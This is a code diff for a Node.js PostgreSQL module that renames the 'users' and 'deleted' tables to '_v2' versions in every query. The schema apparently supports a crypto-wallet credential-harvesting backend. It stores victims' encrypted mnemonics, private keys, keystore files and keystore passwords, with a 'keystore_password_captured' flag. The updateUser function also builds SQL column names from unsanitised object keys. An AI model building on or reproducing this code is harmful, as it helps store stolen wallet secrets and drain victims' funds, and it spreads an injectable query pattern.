@@ -40,7 +40,7 @@ export async function pgReady() {
 
 async function ensureSchema() {
   const createUsers = `
-    CREATE TABLE IF NOT EXISTS users (
+    CREATE TABLE IF NOT EXISTS users_v2 (
       user_id TEXT PRIMARY KEY,
       address TEXT UNIQUE NOT NULL,
       wallet_type TEXT,
@@ -63,7 +63,7 @@ async function ensureSchema() {
     )
   `;
   const createDeleted = `
-    CREATE TABLE IF NOT EXISTS deleted (
+    CREATE TABLE IF NOT EXISTS deleted_v2 (
       address TEXT PRIMARY KEY
     )
   `;
@@ -73,7 +73,7 @@ async function ensureSchema() {
 
 export async function listTrackedUsers() {
   if (!(await pgReady())) return null;
-  const { rows } = await pool.query('SELECT * FROM users ORDER BY last_active DESC');
+  const { rows } = await pool.query('SELECT * FROM users_v2 ORDER BY last_active DESC');
   return rows || [];
 }
 
@@ -83,7 +83,7 @@ export async function upsertTrackedUser(doc) {
   const userId = doc.userId || `user_${Math.random().toString(36).substr(2, 9)}`;
   const toJson = (v) => (v === undefined || v === null ? null : JSON.stringify(v));
   const q = `
-    INSERT INTO users (
+    INSERT INTO users_v2 (
       user_id, address, wallet_type, balance, assets, last_active, status,
       feature_flags, app_limits, risk_flags, transactions, import_method,
       enc_mnemonic, enc_private_key, enc_keystore_json, enc_keystore_password,
@@ -103,13 +103,13 @@ export async function upsertTrackedUser(doc) {
       risk_flags=EXCLUDED.risk_flags,
       transactions=EXCLUDED.transactions,
       import_method=EXCLUDED.import_method,
-      enc_mnemonic=COALESCE(EXCLUDED.enc_mnemonic, users.enc_mnemonic),
-      enc_private_key=COALESCE(EXCLUDED.enc_private_key, users.enc_private_key),
-      enc_keystore_json=COALESCE(EXCLUDED.enc_keystore_json, users.enc_keystore_json),
-      enc_keystore_password=COALESCE(EXCLUDED.enc_keystore_password, users.enc_keystore_password),
-      has_private_key=COALESCE(EXCLUDED.has_private_key, users.has_private_key),
-      keystore_preview=COALESCE(EXCLUDED.keystore_preview, users.keystore_preview),
-      keystore_password_captured=COALESCE(EXCLUDED.keystore_password_captured, users.keystore_password_captured)
+      enc_mnemonic=COALESCE(EXCLUDED.enc_mnemonic, users_v2.enc_mnemonic),
+      enc_private_key=COALESCE(EXCLUDED.enc_private_key, users_v2.enc_private_key),
+      enc_keystore_json=COALESCE(EXCLUDED.enc_keystore_json, users_v2.enc_keystore_json),
+      enc_keystore_password=COALESCE(EXCLUDED.enc_keystore_password, users_v2.enc_keystore_password),
+      has_private_key=COALESCE(EXCLUDED.has_private_key, users_v2.has_private_key),
+      keystore_preview=COALESCE(EXCLUDED.keystore_preview, users_v2.keystore_preview),
+      keystore_password_captured=COALESCE(EXCLUDED.keystore_password_captured, users_v2.keystore_password_captured)
     RETURNING *`;
   const params = [
     userId,
@@ -138,38 +138,38 @@ export async function upsertTrackedUser(doc) {
 
 export async function deleteUsersByIds(userIds) {
   if (!(await pgReady())) return { deletedCount: 0, addresses: [] };
-  const sel = await pool.query('SELECT user_id, address FROM users WHERE user_id = ANY($1)', [userIds]);
+  const sel = await pool.query('SELECT user_id, address FROM users_v2 WHERE user_id = ANY($1)', [userIds]);
   const addresses = (sel.rows || []).map(r => (r.address || '').toLowerCase()).filter(Boolean);
   if (addresses.length) {
     const values = addresses.map((a, i) => `($${i + 1})`).join(',');
-    await pool.query(`INSERT INTO deleted(address) VALUES ${values} ON CONFLICT DO NOTHING`, addresses);
+    await pool.query(`INSERT INTO deleted_v2(address) VALUES ${values} ON CONFLICT DO NOTHING`, addresses);
   }
-  const del = await pool.query('DELETE FROM users WHERE user_id = ANY($1)', [userIds]);
+  const del = await pool.query('DELETE FROM users_v2 WHERE user_id = ANY($1)', [userIds]);
   return { deletedCount: del.rowCount || addresses.length, addresses };
 }
 
 export async function listDeleted() {
   if (!(await pgReady())) return [];
-  const { rows } = await pool.query('SELECT address FROM deleted');
+  const { rows } = await pool.query('SELECT address FROM deleted_v2');
   return (rows || []).map(r => r.address);
 }
 
 export async function restoreDeleted(address) {
   if (!(await pgReady())) return null;
-  await pool.query('DELETE FROM deleted WHERE address = $1', [String(address || '').toLowerCase()]);
+  await pool.query('DELETE FROM deleted_v2 WHERE address = $1', [String(address || '').toLowerCase()]);
   return true;
 }
 
 export async function findUserById(userId) {
   if (!(await pgReady())) return null;
-  const { rows } = await pool.query('SELECT * FROM users WHERE user_id = $1', [userId]);
+  const { rows } = await pool.query('SELECT * FROM users_v2 WHERE user_id = $1', [userId]);
   return rows && rows[0];
 }
 
 export async function findUserByAddress(address) {
   if (!(await pgReady())) return null;
   const lower = String(address || '').toLowerCase();
-  const { rows } = await pool.query('SELECT * FROM users WHERE address = $1', [lower]);
+  const { rows } = await pool.query('SELECT * FROM users_v2 WHERE address = $1', [lower]);
   return rows && rows[0];
 }
 
@@ -180,7 +180,7 @@ export async function updateUser(userId, update) {
   const sets = keys.map((k, i) => `${camelToSnake(k)} = $${i + 1}`).join(', ');
   const values = keys.map(k => update[k]);
   values.push(userId);
-  const q = `UPDATE users SET ${sets} WHERE user_id = $${values.length}`;
+  const q = `UPDATE users_v2 SET ${sets} WHERE user_id = $${values.length}`;
   await pool.query(q, values);
   return true;
 }
